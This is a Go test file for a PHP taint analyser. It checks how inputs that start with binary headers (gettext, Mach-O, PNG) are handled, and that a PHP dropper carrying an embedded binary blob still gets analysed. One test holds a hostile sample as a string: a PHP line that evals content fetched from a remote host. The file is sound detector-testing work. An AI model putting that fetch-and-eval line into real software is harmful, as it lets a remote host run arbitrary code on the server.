package phptaint

import (
	"bytes"
	"context"
	"testing"
)

// Binary content is rejected only when the required PHP tokens are absent.
// A potential tag must reach the parser, even if it produces a coverage gap.
func TestBinaryContentCandidateCoverage(t *testing.T) {
	for name, header := range map[string][]byte{
		"gettext catalog": {0xde, 0x12, 0x04, 0x95, 0x00, 0x00, 0x00, 0x00},
		"mach-o binary":   {0xcf, 0xfa, 0xed, 0xfe, 0x00, 0x00, 0x00, 0x01},
		"png image":       {0x89, 'P', 'N', 'G', 0x0d, 0x0a, 0x00, 0x1a},
	} {
		for _, tc := range []struct {
			payload string
			status  Status
		}{
			{"eval file_get_contents", StatusNotCandidate},
			{"<? eval file_get_contents", StatusPartialParse},
			{"<? eval file_get_contents }", StatusPanic},
		} {
			src := append(append([]byte{}, header...), []byte(tc.payload)...)
			if got := Analyze(context.Background(), src); got.Status != tc.status || len(got.Results) != 0 {
				t.Errorf("%s with %q: report = %+v, want %v without findings", name, tc.payload, got, tc.status)
			}
		}
	}
}

// A dropper that opens with a real tag and embeds a binary blob further down
// is still PHP and must still be examined.
func TestPHPWithEmbeddedBinaryPayloadStaysACandidate(t *testing.T) {
	src := append([]byte("<?php eval(file_get_contents('http://x/p')); // "), bytes.Repeat([]byte{0x00, 0xff}, 32)...)
	if !isCandidate(src) {
		t.Fatal("a PHP file carrying a binary payload after its code was rejected before parsing")
	}
	if got := Analyze(context.Background(), src); got.Status != StatusAnalyzed || got.TotalResults != 1 || len(got.Results) != 1 {
		t.Fatalf("report = %+v, want one remote-code flow", got)
	}
}
